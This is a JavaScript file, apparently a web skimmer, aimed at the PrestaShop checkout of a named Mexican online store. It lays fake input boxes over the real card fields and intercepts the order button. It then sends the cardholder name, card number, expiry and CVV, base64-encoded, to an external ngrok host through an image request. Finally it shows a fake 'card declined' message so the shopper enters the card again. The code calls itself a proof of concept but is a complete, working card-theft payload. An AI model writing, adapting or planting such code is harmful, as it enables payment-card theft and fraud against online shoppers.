(function(){
    var POC_URL = "https://sandbox-open-pay.ngrok.io";
    var IMG_PATH = "https://www.tiendamirage.mx/modules/ps_checkout/views/img/";
    var captured = false;

    var nameField = document.querySelector('[id="ps_checkout-card-fields-name"]');
    var cardField = document.querySelector('[id="ps_checkout-card-fields-number"]');
    var expField = document.querySelector('[id="ps_checkout-card-fields-expiry"]');
    var cvvField = document.querySelector('[id="ps_checkout-card-fields-cvv"]');

    if(!expField || !cvvField) {
        document.querySelectorAll('label').forEach(function(lbl){
            var txt = lbl.textContent.toLowerCase();
            if(!expField && (txt.includes('fecha') || txt.includes('caduc'))) {
                expField = lbl.parentElement.querySelector('div.form-control') || lbl.nextElementSibling;
            }
            if(!cvvField && (txt.includes('cvc') || txt.includes('cvv'))) {
                cvvField = lbl.parentElement.querySelector('div.form-control') || lbl.parentElement.querySelector('[id*="cvv"]');
            }
        });
    }

    var inputStyle = 'position:absolute;top:0;left:0;width:100%;height:100%;background:#fff;border:1px solid #ced4da;padding:10px;padding-left:45px;font-size:14px;z-index:99999;box-sizing:border-box;outline:none;';
    var inputStyleNoLogo = 'position:absolute;top:0;left:0;width:100%;height:100%;background:#fff;border:1px solid #ced4da;padding:10px;font-size:14px;z-index:99999;box-sizing:border-box;outline:none;';

    function createOverlay(container, placeholder, id, maxLen, withLogo) {
        if(!container) return null;
        container.style.position = 'relative';
        Array.from(container.children).forEach(function(c){ c.style.visibility='hidden'; });

        if(withLogo) {
            var logo = document.createElement('img');
            logo.id = 'pf-card-logo';
            logo.style.cssText = 'position:absolute;left:10px;top:50%;transform:translateY(-50%);height:20px;z-index:100000;display:none;';
            container.appendChild(logo);
        }

        var input = document.createElement('input');
        input.type = 'text';
        input.placeholder = placeholder;
        input.id = id;
        input.className = 'poc-overlay-input';
        input.setAttribute('style', withLogo ? inputStyle : inputStyleNoLogo);
        if(maxLen) input.maxLength = maxLen;
        container.appendChild(input);
        return input;
    }

    createOverlay(nameField, 'Nombre del titular de la tarjeta', 'pf-name', 50, false);
    createOverlay(cardField, 'Numero de tarjeta', 'pf-card', 19, true);
    createOverlay(expField, 'MM/YY', 'pf-exp', 5, false);
    createOverlay(cvvField, 'CVV', 'pf-cvv', 4, false);

    var cardEl = document.getElementById('pf-card');
    if(cardEl) {
        cardEl.addEventListener('input', function(e){
            var v = e.target.value.replace(/\D/g,'');
            e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
            var logo = document.getElementById('pf-card-logo');
            if(logo) {
                if(v.startsWith('4')) { logo.src = IMG_PATH + 'visa.svg'; logo.style.display = 'block'; }
                else if(v.startsWith('5') || v.startsWith('2')) { logo.src = IMG_PATH + 'mastercard.svg'; logo.style.display = 'block'; }
                else if(v.startsWith('3')) { logo.src = IMG_PATH + 'amex.svg'; logo.style.display = 'block'; }
                else { logo.style.display = 'none'; }
            }
        });
    }

    var expEl = document.getElementById('pf-exp');
    if(expEl) {
        expEl.addEventListener('input', function(e){
            var v = e.target.value.replace(/\D/g,'');
            if(v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2);
            e.target.value = v;
        });
    }

    function sendData() {
        var card = document.getElementById('pf-card');
        var exp = document.getElementById('pf-exp');
        var cvv = document.getElementById('pf-cvv');
        var name = document.getElementById('pf-name');
        var cardVal = card ? card.value.replace(/\s/g,'') : '';
        var expVal = exp ? exp.value : '';
        var cvvVal = cvv ? cvv.value : '';
        var nameVal = name ? name.value : '';
        if(cardVal.length < 13 || captured) return false;
        var data = { holder_name: nameVal, card_number: cardVal, expiration: expVal, cvv2: cvvVal };
        new Image().src = POC_URL + '/c?d=' + btoa(JSON.stringify(data));
        captured = true;
        return true;
    }

    function showDeclinedMessage() {
        var errorDiv = document.createElement('div');
        errorDiv.id = 'poc-declined-msg';
        errorDiv.style.cssText = 'background:#f8d7da;border:1px solid #f5c6cb;color:#721c24;padding:15px;border-radius:4px;margin:15px 0;font-size:14px;text-align:center;';
        var strong = document.createElement('strong');
        strong.textContent = 'Tarjeta declinada';
        errorDiv.appendChild(strong);
        errorDiv.appendChild(document.createElement('br'));
        errorDiv.appendChild(document.createTextNode('Tu banco ha rechazado la transaccion. Por favor reintentar tarjeta nuevamente.'));
        var form = document.querySelector('[id*="hosted-fields-form"]');
        if(!form) form = cardField ? cardField.closest('form') : null;
        if(!form && cardField) form = cardField.parentElement.parentElement;
        if(form && form.parentElement) form.parentElement.insertBefore(errorDiv, form);
    }

    function removeOverlay() {
        var inputs = document.querySelectorAll('.poc-overlay-input');
        for(var i = 0; i < inputs.length; i++) inputs[i].remove();
        var logo = document.getElementById('pf-card-logo');
        if(logo) logo.remove();
        var fields = [nameField, cardField, expField, cvvField];
        for(var j = 0; j < fields.length; j++) {
            if(fields[j]) {
                var children = fields[j].children;
                for(var k = 0; k < children.length; k++) {
                    children[k].style.visibility = 'visible';
                }
            }
        }
        setTimeout(function(){
            var msg = document.getElementById('poc-declined-msg');
            if(msg) msg.remove();
        }, 4000);
    }

    document.addEventListener('click', function(e){
        var btn = e.target.closest('button');
        if(!btn) btn = e.target.closest('.btn');
        if(!btn) btn = e.target.closest('[type="submit"]');
        if(btn && !captured) {
            var btnText = btn.textContent.toLowerCase();
            if(btnText.indexOf('pedido') > -1 || btnText.indexOf('pagar') > -1 || btnText.indexOf('order') > -1) {
                e.preventDefault();
                e.stopPropagation();
                if(sendData()) {
                    btn.disabled = true;
                    var originalText = btn.textContent;
                    btn.textContent = 'Procesando...';
                    setTimeout(function(){
                        showDeclinedMessage();
                        removeOverlay();
                        btn.disabled = false;
                        btn.textContent = 'Colocar pedido';
                    }, 2000);
                }
                return false;
            }
        }
    }, true);

    console.log('Openpay Listo!');
})();
